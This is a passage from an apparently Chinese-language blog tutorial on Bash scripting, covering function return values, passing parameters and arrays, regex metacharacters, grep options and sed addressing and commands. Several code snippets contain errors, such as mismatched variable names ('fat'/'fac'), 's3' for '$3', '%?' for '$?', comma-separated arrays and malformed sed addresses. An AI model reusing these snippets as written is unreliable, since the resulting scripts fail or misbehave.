class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line"><span class="function"><span class="title">factorial</span></span>()&#123;</span><br><span class="line">fat=1</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq <span class="variable">$1</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> fac*=<span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$1</span>的阶乘:<span class="variable">$fac</span>"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial <span class="variable">$1</span>  <span class="comment"># 位置变量，调用</span></span><br></pre></td></tr></table></figure><p>调用4</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果函数再另一个文件里面，先执行一下，后面再调用</span></span><br><span class="line">./f1.sh</span><br></pre></td></tr></table></figure><p><strong>返回值</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line"><span class="function"><span class="title">fun2</span></span>()&#123;</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"enter a number:"</span> num</span><br><span class="line"><span class="built_in">let</span> 2*<span class="variable">$num</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> $[2*<span class="variable">$num</span>]</span><br><span class="line">&#125;</span><br><span class="line">fun2</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"funcion return value: %?"</span> <span class="comment"># 上一个命令的返回值（函数值最后一条命令的返回的状态码）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"funcion return: $?"</span>  <span class="comment"># 函数的返回值(也可以自定义，但是默认shell返回码,最大不能超过255)</span></span><br></pre></td></tr></table></figure><p>如果想返回字符串等:   函数的输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line"><span class="function"><span class="title">fun2</span></span>()&#123;</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"enter a number:"</span> num</span><br><span class="line"><span class="built_in">echo</span> $[2*<span class="variable">$num</span>]   <span class="comment"># echo</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">result=`fun2`     <span class="comment"># 使用函数的输出</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"return_out value: <span class="variable">$result</span>"</span></span><br></pre></td></tr></table></figure><p><strong>参数的传递</strong></p><p>1.位置参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -ne 3 ];<span class="keyword">then</span>   <span class="comment"># 如果参数不是三个</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Usage: `basename <span class="variable">$0</span>`par1 par2 par3 "</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">parm_func</span></span>()&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$(($1 * $2 * s3)</span>)"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result=`parm_func <span class="variable">$1</span> <span class="variable">$2</span> <span class="variable">$3</span>`  <span class="comment"># 分清：程序的位置参数，函数的位置参数</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"result is: <span class="variable">$result</span>"</span></span><br></pre></td></tr></table></figure><p>2.数组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line">num=(1,2,3,4,5)</span><br><span class="line"><span class="comment">#echo "$&#123;num[@]&#125;"  #打印所有元素</span></span><br><span class="line"><span class="function"><span class="title">arr_parm</span></span>() &#123;</span><br><span class="line"><span class="built_in">local</span> fa=1   <span class="comment">## 局部变量，只在函数内部生效</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"<span class="variable">$@</span>"</span></span><br><span class="line"><span class="comment">#for i in $*</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> fa*=<span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$fa</span>"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#arr_parm $&#123;num[@]&#125;</span></span><br><span class="line">arr_parm <span class="variable">$&#123;num[*]&#125;</span>   <span class="comment"># 数组所有 元素值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拓展：</span></span><br><span class="line"><span class="comment"># for i in $*     # 所有参数</span></span><br><span class="line"><span class="comment"># for i</span></span><br></pre></td></tr></table></figure><p>传数组到函数中 –&gt; 运算 –&gt; 输出数组形式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line">num=(1,2,3,4,5)</span><br><span class="line"><span class="function"><span class="title">array</span></span>() &#123;</span><br><span class="line"><span class="comment">#echo "所有参数: $*"</span></span><br><span class="line"><span class="built_in">local</span> new_arr=(`<span class="built_in">echo</span> $*`)</span><br><span class="line"><span class="comment">#local new_arr=($*)</span></span><br><span class="line"><span class="built_in">local</span> i</span><br><span class="line"><span class="keyword">for</span> ((i=0;i&lt;<span class="variable">$#</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">out_arr[<span class="variable">$i</span>]=$[ <span class="variable">$&#123;[$i]&#125;</span>*5 ]</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;out_arr[*]&#125;</span>"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result=`array<span class="variable">$&#123;num[*]&#125;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;result[*]&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line">num=(1,2,3,4,5)</span><br><span class="line"><span class="function"><span class="title">array</span></span>() &#123;</span><br><span class="line"><span class="built_in">local</span> i</span><br><span class="line"><span class="built_in">local</span> new_arr=()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">new_arr[j++]=$[<span class="variable">$i</span>*5]</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;new_arr[*]&#125;</span>"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result=`array<span class="variable">$&#123;num[*]&#125;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;result[*]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数接收位置参数 $1   $2    $3</span></span><br><span class="line"><span class="comment"># 函数接收数组参数 $*   或  $@</span></span><br><span class="line"><span class="comment">#函数将接收到的所有参数赋值给数组   new_arr=($*)</span></span><br></pre></td></tr></table></figure><h4 id="七-正则"><a href="#七-正则" class="headerlink" title="七.正则"></a>七.正则</h4><p>大多数程序中，正则表达式被放在两个正斜杠之间, 比如：<code>/L[oO]ve/</code></p><p><strong>入门小例子</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 简单实例（不严谨的例子，我们写shell脚本没必要写那么复杂，我们的脚本是给自己用的多）</span></span><br><span class="line">匹配数字：    ^[0-9]+$</span><br><span class="line">匹配Email： [a-z0-9_]+@[a-z0-9]+\.</span><br><span class="line">匹配IP： [0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;</span><br><span class="line">或者  [[:digit:]]&#123;1,3&#125;\.[[:digit:]]&#123;1,3&#125;\.[[:digit:]]&#123;1,3&#125;\.[[:digit:]&#123;1,3&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">egrep <span class="string">'[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;'</span> /etc/sysconfig/network-scripts/ifcfg-eth0</span><br></pre></td></tr></table></figure><p><strong>正则 元字符</strong></p><p>注意和shell的元字符是不太一样的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由执行模式匹配的操作的程序来解析，比如vi，grep，sed，awk，python</span></span><br><span class="line"><span class="comment"># 只要不是shell，就是正则的元字符</span></span><br><span class="line"></span><br><span class="line">rm -rf *.pdf  <span class="comment"># shell中的*， 匹配任意</span></span><br><span class="line">grep <span class="string">'c*'</span> /etc/passwd   <span class="comment"># c出现0次或者多次</span></span><br><span class="line">egrep <span class="string">'c+'</span> /etc/passwd   <span class="comment"># +要使用egrep或反斜杠</span></span><br><span class="line"></span><br><span class="line">vim中替换： `:%s/\&lt;[tT]om\&gt;/TOM/g`    <span class="comment"># 尖括号括起来的是单词</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 例子：</span></span><br><span class="line">grep <span class="string">"sh$"</span> /etc/passwd</span><br><span class="line">grep <span class="string">"ro*t"</span> /etc/passwd</span><br><span class="line">grep <span class="string">"^[rot]"</span> /etc/passwd   <span class="comment"># 以r或o或t开头的</span></span><br></pre></td></tr></table></figure><p>1.基本元字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">^行首定位符^love</span><br><span class="line">$行位定位符love$</span><br><span class="line">.匹配单个字符l..e</span><br><span class="line">*匹配前导符0到多次ab*love</span><br><span class="line">.*任意多个字符</span><br><span class="line">[]匹配指定范围内的一个字符[lL]ove</span><br><span class="line">[-]匹配指定范围内的一个字符[a-z0-9]ove</span><br><span class="line">[^]匹配不再指定组内的一个字符     [^a-z0-9]ove</span><br><span class="line">\用来转义元字符love\.</span><br><span class="line">\&lt;词首定位符\&lt;love</span><br><span class="line">\&gt;词尾定位符love\&gt;</span><br><span class="line">\(..\)  匹配稍后使用的字符的标签 :%s/172.16.130.1/172.16.130.5/</span><br><span class="line"> :%s/\(172.16.130.\)1/\15/</span><br><span class="line"> :%s/\(172.\)\(16.\)\(130.\)1/\1\2\35/</span><br><span class="line"> :3,9s/\(.*\)/<span class="comment">#\1/   # 把第3-9行整行注释掉</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 大括号每一半前面要加斜线记得</span></span><br><span class="line">x\&#123;m\&#125;     字符x重复出现m次 o\&#123;5\&#125;</span><br><span class="line">x\&#123;m,\&#125;    字符x重复出现m次以上 o\&#123;5,\&#125;</span><br><span class="line">x\&#123;m,n\&#125; 字符x重复出现m次 o\&#123;5,10\&#125;</span><br></pre></td></tr></table></figure><p> 2.拓展正则表达式元字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+匹配一个或多个前导字符[a-z]+ove</span><br><span class="line">?匹配零个或一个前导字符lo?ve   <span class="comment"># o出现0次或1次    ss -an |egrep ':80:22\&gt;'</span></span><br><span class="line">a|b  匹配a或blove|hate</span><br><span class="line">()组 字符 loveablle|rs    love(able|rs)ov+  (ov)+   ov+   <span class="comment"># 里面内容作为一个整体</span></span><br><span class="line">(..)(..)\1\2标签匹配字符(love)able\1er      <span class="comment"># 不带斜线</span></span><br><span class="line"></span><br><span class="line">x&#123;m&#125;字符x重复出现m次  o&#123;5&#125;</span><br><span class="line">x&#123;m,&#125;字符x重复至少m次o&#123;5,&#125;</span><br><span class="line">x&#123;m,n&#125;字符x重复m到n次o&#123;5,10&#125;</span><br></pre></td></tr></table></figure><p> 3.POSIX字符类 （类似于shell中环境变量，已经定义好的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[:alnum:]字母与数字字符[[:alnum:]]+        <span class="comment"># 外面的方括号是包里面的</span></span><br><span class="line">[:alpha:]字母字符（包括大小写字母）[[:alpha:]]&#123;4&#125;</span><br><span class="line">[:blank:]空格与制表符[[:blank:]]*</span><br><span class="line">[:digit:]数字[[:digit:]]?</span><br><span class="line">[:lower:]小写字母[[:lower:]]&#123;5,&#125;</span><br><span class="line">[:upper:]大写字母[[:upper:]]+</span><br><span class="line">[:punct:]标点符号[[:punct:]]</span><br><span class="line">[:space:]包括换行符、回撤等在内的所有空白[[:space:]]+</span><br></pre></td></tr></table></figure><p>带括号与不带括号：</p><p><img src="/shell脚本基本知识/带括号与不带括号.png"></p><p>正则匹配实例：vim中查找替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 空行：</span></span><br><span class="line">/^$/</span><br><span class="line">/^[\t]*$/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注释行：</span></span><br><span class="line">/^<span class="comment">#/</span></span><br><span class="line">/^[\t]*<span class="comment">#/</span></span><br></pre></td></tr></table></figure><p><strong>grep</strong></p><ul><li>grep       文件中查找指定的正则表达式</li><li>egrep     拓展的egrep，支持更多的正则表达式元字符</li><li>fgrep      固定grep(fixed grep),有时也被称作快速(fast grep), 它按字面解释所有的字符</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#过滤（尽量加引号）</span></span><br><span class="line">grep [选项] PATTERN 文件 文件 文件</span><br><span class="line"></span><br><span class="line">grep -q <span class="string">"root"</span> /etc/passwd : <span class="built_in">echo</span> $?</span><br><span class="line"><span class="comment"># 返回值：</span></span><br><span class="line"><span class="comment"># 0  找到</span></span><br><span class="line"><span class="comment"># 1  没找到</span></span><br><span class="line"><span class="comment"># 2  找不到指定文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># grep的输入可以来自：文件、标准输入、管道</span></span><br><span class="line">ss -an |grep <span class="string">":22$"</span></span><br><span class="line">ll |grep <span class="string">'^d'</span>   <span class="comment"># 找出目录</span></span><br></pre></td></tr></table></figure><p>使用的元字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">grep：     使用基本元字符集  ^, $, ., *, [], [^], \&lt;\&gt;, \(\),  \&#123;\&#125;, \+, </span><br><span class="line">egrep：   使用扩展元字符集  ?, +, &#123;&#125;, |, ()</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">Note: grep也可以使用扩展元字符集，仅需再这些元字符前置一个反斜线(尖号不行)</span><br><span class="line"></span><br><span class="line">\w    所有字母与数字，称之为字符，即 [a-zA-Z0-9]</span><br><span class="line">\W    与上面相反，非字符     [^a-zA-Z0-9]</span><br><span class="line">\b    词边界</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># grep -E 或 egrep</span></span><br></pre></td></tr></table></figure><p>grep选项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-v取反，只显示不匹配的</span><br><span class="line">-i  忽略大小写</span><br><span class="line">-l      只列出匹配行所在的文件名(哪些文件里面有这些匹配)</span><br><span class="line">-n      再每一行前面加上他所在文件中的相对行号</span><br><span class="line">-c      显示成功匹配的行数</span><br><span class="line">-s      禁止显示文件不存在或文件不可读的错误信息</span><br><span class="line">-q      静默</span><br><span class="line">--color 颜色</span><br><span class="line">-R, -r  递归针对目录</span><br><span class="line">-o      只显示匹配的内容</span><br><span class="line">-B      前几行  grep -C2 <span class="string">'root'</span> /etc/passwd </span><br><span class="line">-A      后几行</span><br><span class="line">-C      上下几行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nmap --<span class="built_in">help</span> |grep <span class="string">'\-u'</span>  <span class="comment"># 查看帮助文档里的-u</span></span><br></pre></td></tr></table></figure><h4 id="八-sed"><a href="#八-sed" class="headerlink" title="八.sed"></a>八.sed</h4><p>sed: 流编辑器，在线的、非交互式的编辑器（而vi是交互式的）</p><p><strong>sed工作流程</strong></p><p>文本文件  -&gt; sed的模式空间(缓冲区)  –&gt; 输出</p><p><strong>命令格式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sed [options] 'cmd' file(s)</span></span><br><span class="line">sed [options] -f scriptfile file(s)</span><br></pre></td></tr></table></figure><blockquote><p>sed不管是够找到指定的模式，他的退出状态都是0。 只有当命令<code>语法存在错误</code>时候，才是非0</p></blockquote><p><strong>可以在命令行，也可以在脚本里面使用</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">'d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># d 删除</span></span><br><span class="line">sed <span class="string">'4d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 4d 删除第四行</span></span><br><span class="line"><span class="comment"># i 修改文件(不是输出到屏幕上)</span></span><br></pre></td></tr></table></figure><p><strong>支持正则表达式</strong></p><p>支持的元字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本元字符集: ^, $, ., *, [], [^], \&lt;\&gt;, \(\), \&#123;\&#125; </span></span><br><span class="line"><span class="comment"># 扩展元字符集: ?, +, &#123;&#125;, |, ()</span></span><br></pre></td></tr></table></figure><p>使用扩展元字符的方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sed  --<span class="built_in">help</span>|grep <span class="string">'\-r'</span></span><br><span class="line"> <span class="comment"># </span></span><br><span class="line"> \+</span><br><span class="line"> sed -r</span><br></pre></td></tr></table></figure><p>基本用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sed -r <span class="string">''</span> /etc/<span class="built_in">test</span>    <span class="comment"># '' 没任何动作</span></span><br><span class="line">sed -r <span class="string">'d'</span> /etc/<span class="built_in">test</span> </span><br><span class="line">sed -r <span class="string">'p'</span> /etc/<span class="built_in">test</span>    <span class="comment"># p 打印</span></span><br><span class="line">sed -r -n <span class="string">'p'</span> /etc/<span class="built_in">test</span>    </span><br><span class="line">sed -r -n <span class="string">'/root/p'</span> /etc/<span class="built_in">test</span>    <span class="comment"># -n  静默方式</span></span><br><span class="line"><span class="comment"># 上面四种不建议用(打印这种事情用不着sed，有别的打印就行)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 下面的功能才重点学</span></span><br><span class="line">sed -r <span class="string">'s/root/xps'</span> /etc/<span class="built_in">test</span>    <span class="comment"># 所有行查找替换,root换成大小写（只替换一次）</span></span><br><span class="line">sed -r <span class="string">'s/root/xps/g'</span> /etc/<span class="built_in">test</span>  <span class="comment"># g 全局</span></span><br><span class="line">sed -r <span class="string">'s/root/xps/gi'</span> /etc/<span class="built_in">test</span>  <span class="comment"># i  忽略大小写</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'/root/d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 没有s就是查找， 查找带root的行，然后删除</span></span><br><span class="line">sed -r <span class="string">'\#root#d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 查找：可以使用#等符号--&gt;不一定要斜线，但是前面要加\转义；查找替换:不用转义</span></span><br></pre></td></tr></table></figure><p><strong>地址(定址)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于决定对哪些行进行编辑。地址形式可以是数字、正则或二者的结合(如果没有指定,sed将处理输入文件中的所有行)</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'d'</span> /etc/<span class="built_in">test</span> </span><br><span class="line">sed -r <span class="string">'3d'</span> /etc/<span class="built_in">test</span> </span><br><span class="line">sed -r <span class="string">'1,3d'</span> /etc/<span class="built_in">test</span> </span><br><span class="line">sed -r <span class="string">'/root/d'</span> /etc/<span class="built_in">test</span>    <span class="comment"># 删除root的行</span></span><br><span class="line">sed -r <span class="string">'root/,5d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 从root行开始，到第5行删除</span></span><br><span class="line">sed -r <span class="string">'s/root/xps/g'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 替换</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'/^adm/,20d'</span> /etc/<span class="built_in">test</span>  <span class="comment"># 从adm开头的那一行，删除到第20行</span></span><br><span class="line">sed -r <span class="string">'/^adm/,+20d'</span> /etc/<span class="built_in">test</span> <span class="comment"># 从adm开头的那一行，再往后删除20行</span></span><br><span class="line">sed -r <span class="string">'/2,5d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 第二行到第五行 </span></span><br><span class="line">sed -r <span class="string">'/root/d'</span> /etc/<span class="built_in">test</span>    <span class="comment"># 带root的行删除</span></span><br><span class="line">sed -r <span class="string">'/root/!d'</span> /etc/<span class="built_in">test</span>  <span class="comment"># 除了root行以外都删除</span></span><br><span class="line"></span><br><span class="line">sed -r <span class="string">'1~2d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 删除所有奇数行(从1开始，每隔两行删)</span></span><br><span class="line">sed -r <span class="string">'0~2d'</span> /etc/<span class="built_in">test</span>   <span class="comment"># 删除所有偶数行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拓展：</span></span><br><span class="line">vim中： 使用 `:r /etc/passwd` 来读取文件内容</span><br></pre></td></tr></table></figure><p><strong>命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 告诉sed对指定行进行何种操作</span></span><br><span class="line">a  在当前行后添加一行或多行</span><br><span class="line">c     用新文本修改(替换)当前行中的文本</span><br><span class="line">d 删除行</span><br><span class="line">i 在当前行前插入文本</span><br><span class="line">l    列出非打印字符</span><br><span class="line">p 打印行 </span><br><span class="line">n读入下一输入行，并从下一条命令而不是第一条命令开始对其的处理</span><br><span class="line">q结束或退出sed</span><br><span class="line">!取反(对所选行以外的所有行应用)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s 用一个字符串替换另一个</span><br><span class="line">s 替换标志</span><br><span class="line">g 在行内进行全局替换</span><br><span class="line">i 忽略大小写</span><br><span class="line">r 从文件中读</span><br><span class="line">w 将行写入文件</span><br><span class="line">y将字符转换为另一个字符（不支持正则）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">h 把模式空间里的内容复制到暂存缓冲区(覆盖)</span><br><span class="line">H 把模式空间里的内容支架到暂存缓冲区中</span><br><span class="line">g 取出暂存缓冲区中的内容，将其复制到模式空间，覆盖该处原有内容</span><br><span class="line">G 取出暂存缓冲区中的内容，将其复制到模式空间，追加在原有内容后门</span><br><span class="line">x 交换暂存缓冲区域模式空间的内容</span><br></pre></td></tr></table></figure><p><strong>例子</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 